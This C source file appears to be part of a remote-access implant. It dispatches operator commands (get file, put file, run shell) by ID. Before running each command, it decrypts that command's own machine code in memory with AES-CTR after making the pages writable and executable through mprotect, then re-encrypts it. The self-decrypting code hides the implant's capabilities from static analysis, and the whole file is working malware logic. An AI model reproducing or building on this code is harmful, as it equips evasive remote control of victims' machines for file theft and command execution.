#include "commands.h"

size_t round_up(size_t num, size_t multiple) {
    return ((num / multiple) + (num % multiple ? 1 : 0)) * multiple;
}

size_t round_down(size_t num, size_t multiple) {
    return (num / multiple) * multiple;
}

result xcrypt_command(const char *key, const char *iv, const unsigned char *start_address,
                      const unsigned char *end_address) {
    INITIALIZE_RESULT(res);
    struct AES_ctx command_ctx;
    AES_init_ctx_iv(&command_ctx, (const uint8_t *) key, (const uint8_t *) iv);

    size_t pagesize = sysconf(_SC_PAGE_SIZE);
    if (pagesize == -1) {
        HANDLE_ERROR(res, FAILED_SYSCONF, "Failed getting page size", NULL)
    }

    void *start_address_p = (void *) round_down((size_t) start_address, pagesize);
    size_t section_size = round_up((size_t) end_address, pagesize) - round_down((size_t) start_address, pagesize);
    if (mprotect(start_address_p, section_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    AES_CTR_xcrypt_buffer(&command_ctx, (uint8_t *) start_address, end_address - start_address);

    if (mprotect(start_address_p, section_size, PROT_READ | PROT_EXEC) == -1) {
        HANDLE_ERROR(res, FAILED_MPROTECT, "Failed changing code protection", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

buffer run_command(result *res, uint64_t command_id, const char *key, const char *iv, buffer *buf) {
    WRITE_LOG(INFO, "Running command: %llx", command_id)

    INITIALIZE_BUFFER(buf_out);
    INITIALIZE_RESULT(tmp_res);

    buffer (*chosen_command)(result *, buffer *) = NULL;
    unsigned char **start_address;
    unsigned char **end_address;

    if (command_id == GET_FILE_COMMAND_ID) {
        chosen_command = get_file;
        extern unsigned char *__get_file_start;
        extern unsigned char *__get_file_end;
        start_address = &__get_file_start;
        end_address = &__get_file_end;
    } else if (command_id == PUT_FILE_COMMAND_ID) {
        chosen_command = put_file;
        extern unsigned char *__put_file_start;
        extern unsigned char *__put_file_end;
        start_address = &__put_file_start;
        end_address = &__put_file_end;
    } else if (command_id == RUN_SHELL_COMMAND_ID) {
        chosen_command = run_shell;
        extern unsigned char *__run_shell_start;
        extern unsigned char *__run_shell_end;
        start_address = &__run_shell_start;
        end_address = &__run_shell_end;
    } else {
        HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: %llx", command_id)
    }

    *res = xcrypt_command(key, iv, (const unsigned char *) start_address, (const unsigned char *) end_address);
    HANDLE_ERROR_RESULT((*res))

    buf_out = chosen_command(res, buf);
    HANDLE_ERROR_RESULT((*res))

    WRITE_LOG(INFO, "Finished running command: %llx", command_id)

    goto cleanup;

    error_cleanup:

    destroy_buffer(&buf_out);

    cleanup:

    tmp_res = xcrypt_command(key, iv, (const unsigned char *) start_address, (const unsigned char *) end_address);
    if (RESULT_SUCCEEDED((*res))) {
        *res = tmp_res;
    }

    return buf_out;
}
